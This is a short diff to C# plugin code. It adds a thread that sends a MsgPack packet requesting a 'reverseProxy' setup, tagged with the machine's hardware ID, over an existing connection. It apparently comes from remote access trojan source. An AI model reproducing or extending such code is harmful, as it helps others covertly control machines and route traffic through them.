@@ -52,6 +52,11 @@ namespace Plugin
 
                     new Thread(() =>
                     {
+                        MsgPack msgpack = new MsgPack();
+                        msgpack.ForcePathObject("Pac_ket").AsString = "reverseProxy";
+                        msgpack.ForcePathObject("Option").AsString = "SetreverseProxy";
+                        msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
+                        Connection.Send(msgpack.Encode2Bytes());
                         //Packet.CaptureAndSend(30, 0);
                     }).Start();
 
